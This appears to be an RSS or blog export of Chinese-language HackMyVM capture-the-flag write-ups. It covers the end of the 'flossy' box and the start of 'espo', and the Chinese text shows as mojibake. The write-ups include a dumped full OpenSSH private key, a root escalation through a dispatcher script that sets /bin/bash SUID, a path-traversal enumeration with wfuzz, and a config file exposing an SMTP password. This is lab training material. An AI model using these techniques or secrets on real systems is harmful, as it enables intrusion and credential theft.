-rwx------  1 sophie sophie   33 Oct 10  2023 user.txt
-rw-r--r--  1 sophie sophie 3890 Oct  6  2023 .zshrc
‚ï≠‚îÄmalo@flossy /home/sophie 
‚ï∞‚îÄ$ cat SSHKeySync
#!/bin/bash

# This script must run every minute in pre-prod

send_private_key() {
    local user_name='$1'
    local key_path='/home/$user_name/.ssh/id_rsa'
    local admin_tty='/dev/pts/24'

    if [ -f '$key_path' ]; then
        if [ -w '$admin_tty' ]; then
            cat '$key_path' &gt; '$admin_tty'
        else
            echo 'Error: Unable to write to $admin_tty'
        fi
    else
        echo 'Error: The private key for $user_name doesn't exist.'
    fi
}

while true ; do
  USER='sophie'
  echo 'Sending $USER's private key to a high-privileged TTY for quick testing...'
  send_private_key '$USER'
  sleep 1m
done
‚ï≠‚îÄmalo@flossy /home/sophie 
‚ï∞‚îÄ$ tty
/dev/pts/0
```

ËÑöÊú¨ÁöÑÂÆûÁé∞‰∫ÜÊØèÂàÜÈíüÂ∞Ü**sophie**ÁöÑÁßÅÈí•ÂèëÈÄÅÂà∞`/dev/pts/24`‰∏≠ÔºåÊàë‰ª¨Â∞ùËØïÂà©Áî®

```bash
‚ï≠‚îÄmalo@flossy /home/sophie 
‚ï∞‚îÄ$ ls /dev/pts/                                                                                                                   2 ‚Üµ

0  ptmx
‚ï≠‚îÄmalo@flossy /home/sophie 
‚ï∞‚îÄ$ script /dev/null
Script started, output log file is '/dev/null'.
‚ï≠‚îÄmalo@flossy /home/sophie 
‚ï∞‚îÄ$ ls /dev/pts/  

0  1  ptmx
‚ï≠‚îÄmalo@flossy /tmp 
‚ï∞‚îÄ$ cat a.sh
#!/bin/bash

for i in {1..27}
do
    script /dev/pts/$i &amp;
done
‚ï≠‚îÄmalo@flossy /tmp 
‚ï∞‚îÄ$ chmod +x a.sh 
‚ï≠‚îÄmalo@flossy /tmp 
‚ï∞‚îÄ$ bash a.sh 

ÁúÅÁï•

-----BEGIN OPENSSH PRIVATE KEY-----
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\=\=
-----END OPENSSH PRIVATE KEY-----
```

Â∞ÜÂØÜÈí•ÂÜôÂÖ•`id_rsa`‰∏≠ÔºåËøûÊé•sshÔºà**Âª∫ËÆÆÈáçÊñ∞ÂºÄ‰∏™kaliÁ™óÂè£ËøõË°åËøûÊé•Ôºå‰∏çÁÑ∂ÂÆÉ‰∏ÄÁõ¥ÂºπÁßÅÈí•Êå∫ÁÉ¶ÁöÑ**Ôºâ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ssh sophie@127.0.0.1 -i id_rsa 
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:TCA/ssXFaEc0sOJl0lvYyqTVTrCpkF0wQfyj5mJsALc.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '127.0.0.1' (ED25519) to the list of known hosts.
Linux flossy 6.1.0-10-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.37-1 (2023-07-03) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
[oh-my-zsh] Would you like to update? [Y/n] n
[oh-my-zsh] You can update manually by running `omz update`
‚ï≠‚îÄsophie@flossy ~ 
‚ï∞‚îÄ$ id
uid=1001(sophie) gid=1001(sophie) groups=1001(sophie),100(users)
```

ÁªßÁª≠ËøõË°åÊèêÊùÉ

```bash
‚ï≠‚îÄsophie@flossy ~ 
‚ï∞‚îÄ$ sudo -l
sudo: unable to resolve host flossy: Name or service not known
Matching Defaults entries for sophie on flossy:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User sophie may run the following commands on flossy:
    (ALL : ALL) NOPASSWD: /home/sophie/network*
‚ï≠‚îÄsophie@flossy ~ 
‚ï∞‚îÄ$ cat network           
#!/bin/bash


connected_ip(){
        connection_type=TCP
        champ=2
        ignores=LISTEN
        lsof_args=-ni

        port_local='[0-9][0-9][0-9][0-9][0-9]-&gt;'

        lsof '$lsof_args' | grep $connection_type | grep -v '$ignores' |
        awk '{print $9}' | cut -d : -f $champ | sort | uniq |
        sed s/'^$port_local'//
 }

dispatcher() {
    for s in /opt/*; do
        if [ -f '$s' ]; then
            d='/etc/NetworkManager/dispatcher.d/$(basename $s)'
            if [ ! -f '$d' ] || [ '$s' -nt '$d' ]; then
                return 0
            fi
        fi
    done
    return 1
}

update() {
    if [[ -z $(find /opt -type f) ]] ; then
      exit 0
    else
      echo 'Updating scripts.'
      cp /opt/* /etc/NetworkManager/dispatcher.d/
      chmod +x /etc/NetworkManager/dispatcher.d/*
      echo 'Scripts updated.'
    fi
}



case '${1}' in
ip)   connected_ip ;;
disp) dispatcher ; update ;;
*)    echo 'Usage: ./$0 option' ;;
esac
```

Ëøô‰∏™ËÑöÊú¨Âè™Áî®ÂÖ≥Ê≥®ÂÆÉ‰ºöÊää`/opt/`‰∏≠ÁöÑÊâÄÊúâÊñá‰ª∂Â§çÂà∂Âà∞`/etc/NetworkManager/dispatcher.d/`Âπ∂Áªô‰∫àÊâßË°åÊùÉÈôê„ÄÇÂ∞ùËØï**ÊÅ∂ÊÑè‰ª£Á†ÅÊ≥®ÂÖ•**

```bash
‚ï≠‚îÄsophie@flossy /opt
‚ï∞‚îÄ\$ echo 'chmod u+s /bin/bash' &gt; a.sh
‚ï≠‚îÄsophie@flossy /opt 
‚ï∞‚îÄ$ chmod +x a.sh
‚ï≠‚îÄsophie@flossy /opt 
‚ï∞‚îÄ$ sudo /home/sophie/network disp 
sudo: unable to resolve host flossy: Name or service not known
Updating scripts.
Scripts updated.
‚ï≠‚îÄsophie@flossy /opt 
‚ï∞‚îÄ$ ls -la /etc/NetworkManager/dispatcher.d/
total 3468
drwxr-xr-x 5 root root    4096 Jan 17 10:44 .
drwxr-xr-x 7 root root    4096 Oct  6  2023 ..
-rwxr-xr-x 1 root root    2293 Mar  9  2023 01-ifupdown
-rwxr-xr-x 1 root root      20 Jan 17 10:44 a.sh
drwxr-xr-x 2 root root    4096 Mar  9  2023 no-wait.d
drwxr-xr-x 2 root root    4096 Mar  9  2023 pre-down.d
drwxr-xr-x 2 root root    4096 Mar  9  2023 pre-up.d
-rwxr-xr-x 1 root root 3518724 Jan 17 10:44 pspy
‚ï≠‚îÄsophie@flossy /opt 
‚ï∞‚îÄ$ cd /etc/NetworkManager/dispatcher.d/          
‚ï≠‚îÄsophie@flossy /etc/NetworkManager/dispatcher.d 
‚ï∞‚îÄ$ nmcli connection up lo
Connection successfully activated (D-Bus active path: /org/freedesktop/NetworkManager/ActiveConnection/2)
‚ï≠‚îÄsophie@flossy /etc/NetworkManager/dispatcher.d 
‚ï∞‚îÄ$ ls -la /bin/bash                  
-rwsr-xr-x 1 root root 1265648 Apr 23  2023 /bin/bash
‚ï≠‚îÄsophie@flossy /etc/NetworkManager/dispatcher.d 
‚ï∞‚îÄ$ bash -p                                 
bash-5.2# id
uid=1001(sophie) gid=1001(sophie) euid=0(root) groups=1001(sophie),100(users)
```

![Image](https://github.com/user-attachments/assets/6adbe1c8-e9d6-4394-a24d-345116fda9f7)sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/hmv_flossy.html</guid><pubDate>Fri, 27 Jun 2025 09:33:08 +0000</pubDate></item><item><title>hmv_espo</title><link>https://7r1UMPHK.github.io/post/hmv_espo.html</link><description># hmv_espo

# 0.ÁÆÄ‰ªã

**Èù∂Êú∫**Ôºö[hackmyvm - espo](https://hackmyvm.eu/machines/machine.php?vm=espo)
**ÈöæÂ∫¶**ÔºöÈªÑËâ≤
**ÁõÆÊ†á IP**Ôºö192.168.205.236
**Êú¨Êú∫ IP**Ôºö192.168.205.141

---

# 1.Êâ´Êèè

`nmap`Ëµ∑Êâã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ nmap -sS -p- -Pn -n -T4 192.168.205.236
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-08 13:19 CST
Nmap scan report for 192.168.205.236
Host is up (0.00024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:9F:01:54 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 1.40 seconds                                                            
```

---

# 2.Ë∏©ÁÇπ

![image](https://github.com/user-attachments/assets/ba54a62f-4f78-4f4d-89e2-686f549e1ed3)

ÊòØ‰∏™ÁôªÂΩïÊ†èÔºåÊêúÁ¥¢‰∏Ä‰∏ãÊúâÊ≤°Êúâ‰ªÄ‰πàÊºèÊ¥û

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ whatweb http://192.168.205.236                                     
http://192.168.205.236 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx], IP[192.168.205.236], PHP[8.2.7], PoweredBy[EspoCRM], Script[text/javascript], Title[EspoCRM], UncommonHeaders[x-content-type-options,content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/8.2.7], nginx
                                                                                                                                    
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ searchsploit EspoCRM
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
EspoCRM 5.8.5 - Privilege Escalation                                                                | multiple/webapps/48376.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
                                 
```

Âè™ÊúâÊùÉÈôêÊèêÂçáÊºèÊ¥ûÔºå‰ΩÜÊòØÊàë‰ª¨Ê≤°ÊúâÁî®Êà∑„ÄÇÁàÜÁ†¥‰∏Ä‰∏ãÁõÆÂΩï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.236 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -x php,html,txt,md -b 404 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.205.236
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,md,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/admin/]
/install              (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/install/]
/api                  (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/api/]
/index.php            (Status: 200) [Size: 2480]
/portal               (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/portal/]
/client               (Status: 301) [Size: 162] [--&gt; http://192.168.205.236/client/]
/robots.txt           (Status: 200) [Size: 26]
Progress: 42982 / 311425 (13.80%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 44082 / 311425 (14.15%)
===============================================================
Finished
===============================================================
                                 
```

ÂèëÁé∞‰∏ÄÁÇπÊúâÊÑèÊÄùÁöÑ‰∏úË•ø

![image](https://github.com/user-attachments/assets/306ae256-9fb8-4015-8043-7f4c36e3cf51)

![image](https://github.com/user-attachments/assets/cc7f8b66-6f91-4398-b024-d748c9055a51)

Ë≤å‰ººÂèØ‰ª•ÈÄöËøáÁªïËøáËØªÂèñÊñá‰ª∂Â§πÂ§ñÁöÑÊñá‰ª∂ÔºåÊàë‰ª¨ÁàÜÁ†¥ËØïËØï

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -u 'http://192.168.205.236/admin../FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000003:   301        7 L      11 W       162 Ch      'admin'                                                             
000004255:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   
000008002:   301        7 L      11 W       162 Ch      '_oldsite'                                                          
000030014:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   
000059104:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../'                                   

Total time: 0
Processed Requests: 62284
Filtered Requests: 62279
Requests/sec.: 0

              
```

Á°ÆÂÆûÂèØ‰ª•ÔºåÊàë‰ª¨ÁªßÁª≠ÁàÜÁ†¥

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ wfuzz -u 'http://192.168.205.236/admin../_oldsite/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404  
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../_oldsite/FUZZ
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000167:   200        11 L     79 W       540 Ch      'info'                                                              
000004255:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          
000030014:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          
000059104:   403        7 L      9 W        146 Ch      'http://192.168.205.236/admin../_oldsite/'                          

Total time: 34.86630
Processed Requests: 62284
Filtered Requests: 62280
Requests/sec.: 1786.366

                                           
```

Êúâ‰∏™Êñá‰ª∂ÔºåÊàë‰ª¨Êü•Áúã‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test]
‚îî‚îÄ$ curl http://192.168.205.236/admin../_oldsite/info
# Backup Configuration Settings
# This configuration file dictates the backup protocols for critical data storage.

# Directory for storing backup files
# All backup files are stored in compressed ZIP format for efficient space usage and security.
# Ensure that backups are regularly updated and verified for data integrity.

backup_directory: /admin/_oldsite
backup_format: zip
# Note: The backup directory is designated for ZIP file backups only. 
# Regular maintenance and checks are required to ensure data consistency and reliability.
                                                                                            
ÁøªËØë
#Â§á‰ªΩÈÖçÁΩÆËÆæÁΩÆ
#ËØ•ÈÖçÁΩÆÊñá‰ª∂ËßÑÂÆö‰∫ÜÂÖ≥ÈîÆÊï∞ÊçÆÂ≠òÂÇ®ÁöÑÂ§á‰ªΩÂçèËÆÆ„ÄÇ
#Â§á‰ªΩÊñá‰ª∂Â≠òÊîæÁõÆÂΩï
#ÊâÄÊúâÂ§á‰ªΩÊñá‰ª∂ÈÉΩ‰ª•ÂéãÁº©ZIPÊ†ºÂºèÂ≠òÂÇ®Ôºå‰ª•ÊèêÈ´òÁ©∫Èó¥‰ΩøÁî®ÊïàÁéáÂíåÂÆâÂÖ®ÊÄß„ÄÇ
Á°Æ‰øùÂÆöÊúüÊõ¥Êñ∞Â§á‰ªΩÂπ∂È™åËØÅÊï∞ÊçÆÂÆåÊï¥ÊÄß„ÄÇ
backup_directory:/admin/_oldsite
backup_format:zip
Ê≥®ÊÑèÔºöÊåáÂÆöÁöÑÂ§á‰ªΩÁõÆÂΩï‰ªÖÁî®‰∫éZIPÊñá‰ª∂Â§á‰ªΩ„ÄÇ
#ÈúÄË¶ÅÂÆöÊúüÁª¥Êä§ÂíåÊ£ÄÊü•ÔºåÁ°Æ‰øùÊï∞ÊçÆÁöÑ‰∏ÄËá¥ÊÄßÂíåÂèØÈù†ÊÄß„ÄÇ
```

ÂëäËØâ‰∫ÜÊàë‰ª¨‰ºö‰øùÂ≠òÂ§áÊ≥®Êñá‰ª∂ÔºåÂπ∂‰∏îÂ§á‰ªΩÊñá‰ª∂‰ºö‰ª•.zip‰∏∫ÂêéÁºÄÔºåÊàë‰ª¨Ê†πÊçÆ‰ø°ÊÅØÁàÜÁ†¥‰∏Ä‰∏ã

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ wfuzz -u 'http://192.168.205.236/admin../_oldsite/FUZZ.zip' -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt --hc 404 
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.205.236/admin../_oldsite/FUZZ.zip
Total requests: 62284

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                             
=====================================================================

000000066:   200        139379   1377104    36126245    'backup'                                                            
                         L       W          Ch                                                                              

Total time: 36.69276
Processed Requests: 62284
Filtered Requests: 62283
Requests/sec.: 1697.446

                             
```

Êàë‰ª¨ÊääÂ§á‰ªΩÊñá‰ª∂‰∏ãËΩΩ‰∏ãÊù•

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ wget http://192.168.205.236/admin../_oldsite/backup.zip
--2025-01-08 13:40:14--  http://192.168.205.236/admin../_oldsite/backup.zip
Ê≠£Âú®ËøûÊé• 192.168.205.236:80... Â∑≤ËøûÊé•„ÄÇ
Â∑≤ÂèëÂá∫ HTTP ËØ∑Ê±ÇÔºåÊ≠£Âú®Á≠âÂæÖÂõûÂ∫î... 200 OK
ÈïøÂ∫¶Ôºö37975754 (36M) [application/zip]
Ê≠£Âú®‰øùÂ≠òËá≥: ‚Äúbackup.zip‚Äù

backup.zip                        100%[============================================================&gt;]  36.22M  --.-KB/s  Áî®Êó∂ 0.08s   

2025-01-08 13:40:14 (464 MB/s) - Â∑≤‰øùÂ≠ò ‚Äúbackup.zip‚Äù [37975754/37975754])

                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ unzip backup.zip 

‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ ls
application  bootstrap.php    command.php  daemon.php     extension.php  install      public       vendor
backup.zip   clear_cache.php  cron.php     data           html           LICENSE.txt  rebuild.php  web.config
bin          client           custom       EspoCRM-7.2.4  index.php      preload.php  upgrade.php  websocket.php
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp]
‚îî‚îÄ$ cd data 
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/data]
‚îî‚îÄ$ ls -la
ÊÄªËÆ° 44
drwxrwxr-x  7 kali kali 4096 2023Âπ¥12Êúà 4Êó• .
drwxrwxr-x 12 kali kali 4096  1Êúà 8Êó• 13:40 ..
drwxrwxr-x  3 kali kali 4096 2023Âπ¥12Êúà 4Êó• .backup
drwxrwxr-x  3 kali kali 4096 2023Âπ¥12Êúà 4Êó• cache
-rw-rw-r--  1 kali kali  972 2023Âπ¥12Êúà 4Êó• config-internal.php
-rw-rw-r--  1 kali kali 5711 2023Âπ¥12Êúà 4Êó• config.php
-rw-rw-r--  1 kali kali    1 2023Âπ¥12Êúà 4Êó• .data
drwxr-xr-x  2 kali kali 4096 2023Âπ¥12Êúà 4Êó• logs
drwxrwxr-x  2 kali kali 4096 2023Âπ¥12Êúà 4Êó• tmp
drwxrwxr-x  4 kali kali 4096 2023Âπ¥12Êúà 4Êó• upload
                                                                                                                                     
‚îå‚îÄ‚îÄ(kali„âøkali)-[~/test/tmp/data]
‚îî‚îÄ$ cat config.php                                            
&lt;?php
return [
  'useCache' =&gt; true,
  'jobMaxPortion' =&gt; 15,
  'jobRunInParallel' =&gt; false,
  'jobPoolConcurrencyNumber' =&gt; 8,
  'daemonMaxProcessNumber' =&gt; 5,
  'daemonInterval' =&gt; 10,
  'daemonProcessTimeout' =&gt; 36000,
  'recordsPerPage' =&gt; 20,
  'recordsPerPageSmall' =&gt; 5,
  'recordsPerPageSelect' =&gt; 10,
  'applicationName' =&gt; 'EspoCRM',
  'version' =&gt; '7.2.4',
  'timeZone' =&gt; 'UTC',
  'dateFormat' =&gt; 'DD.MM.YYYY',
  'timeFormat' =&gt; 'HH:mm',
  'weekStart' =&gt; 0,
  'thousandSeparator' =&gt; ',',
  'decimalMark' =&gt; '.',
  'exportDelimiter' =&gt; ',',
  'currencyList' =&gt; [
    0 =&gt; 'EUR'
  ],
  'defaultCurrency' =&gt; 'EUR',
  'baseCurrency' =&gt; 'EUR',
  'currencyRates' =&gt; [],
  'outboundEmailIsShared' =&gt; true,
  'outboundEmailFromName' =&gt; 'EspoCRM',
  'outboundEmailFromAddress' =&gt; '',
  'smtpServer' =&gt; '',
  'smtpPort' =&gt; 25,
  'smtpAuth' =&gt; true,
  'smtpSecurity' =&gt; '',
  'smtpUsername' =&gt; 'admin',
  'smtpPassword' =&gt; '39Ue4kcVJ#YpaAV24CNmbWU',
  'language' =&gt; 'en_US',
  'authenticationMethod' =&gt; 'Espo',
  'globalSearchEntityList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity'
  ],
  'tabList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity',
    4 =&gt; 'Case',
    5 =&gt; 'Email',
    6 =&gt; 'Calendar',
    7 =&gt; 'Meeting',
    8 =&gt; 'Call',
    9 =&gt; 'Task',
    10 =&gt; '_delimiter_',
    11 =&gt; 'Document',
    12 =&gt; 'Campaign',
    13 =&gt; 'KnowledgeBaseArticle',
    14 =&gt; 'Stream',
    15 =&gt; 'User'
  ],
  'quickCreateList' =&gt; [
    0 =&gt; 'Account',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Opportunity',
    4 =&gt; 'Meeting',
    5 =&gt; 'Call',
    6 =&gt; 'Task',
    7 =&gt; 'Case',
    8 =&gt; 'Email'
  ],
  'exportDisabled' =&gt; false,
  'adminNotifications' =&gt; true,
  'adminNotificationsNewVersion' =&gt; true,
  'adminNotificationsCronIsNotConfigured' =&gt; true,
  'adminNotificationsNewExtensionVersion' =&gt; true,
  'assignmentEmailNotifications' =&gt; false,
  'assignmentEmailNotificationsEntityList' =&gt; [
    0 =&gt; 'Lead',
    1 =&gt; 'Opportunity',
    2 =&gt; 'Task',
    3 =&gt; 'Case'
  ],
  'assignmentNotificationsEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Task',
    3 =&gt; 'Email'
  ],
  'portalStreamEmailNotifications' =&gt; true,
  'streamEmailNotificationsEntityList' =&gt; [
    0 =&gt; 'Case'
  ],
  'streamEmailNotificationsTypeList' =&gt; [
    0 =&gt; 'Post',
    1 =&gt; 'Status',
    2 =&gt; 'EmailReceived'
  ],
  'emailNotificationsDelay' =&gt; 30,
  'emailMessageMaxSize' =&gt; 10,
  'notificationsCheckInterval' =&gt; 10,
  'maxEmailAccountCount' =&gt; 2,
  'followCreatedEntities' =&gt; false,
  'b2cMode' =&gt; false,
  'theme' =&gt; 'Espo',
  'themeParams' =&gt; (object) [
    'navbar' =&gt; 'side'
  ],
  'massEmailMaxPerHourCount' =&gt; 100,
  'massEmailVerp' =&gt; false,
  'personalEmailMaxPortionSize' =&gt; 50,
  'inboundEmailMaxPortionSize' =&gt; 50,
  'emailAddressLookupEntityTypeList' =&gt; [
    0 =&gt; 'User',
    1 =&gt; 'Contact',
    2 =&gt; 'Lead',
    3 =&gt; 'Account'
  ],
  'authTokenLifetime' =&gt; 0,
  'authTokenMaxIdleTime' =&gt; 48,
  'userNameRegularExpression' =&gt; '[^a-z0-9\\-@_\\.\\s]',
  'addressFormat' =&gt; 1,
  'displayListViewRecordCount' =&gt; true,
  'dashboardLayout' =&gt; [
    0 =&gt; (object) [
      'name' =&gt; 'My Espo',
      'layout' =&gt; [
        0 =&gt; (object) [
          'id' =&gt; 'default-activities',
          'name' =&gt; 'Activities',
          'x' =&gt; 2,
          'y' =&gt; 2,
          'width' =&gt; 2,
          'height' =&gt; 4
        ],
        1 =&gt; (object) [
          'id' =&gt; 'default-stream',
          'name' =&gt; 'Stream',
          'x' =&gt; 0,
          'y' =&gt; 0,
          'width' =&gt; 2,
          'height' =&gt; 4
        ]
      ]
    ]
  ],
  'calendarEntityList' =&gt; [
    0 =&gt; 'Meeting',
    1 =&gt; 'Call',
    2 =&gt; 'Task'
  ],
  'activitiesEntityList' =&gt; [
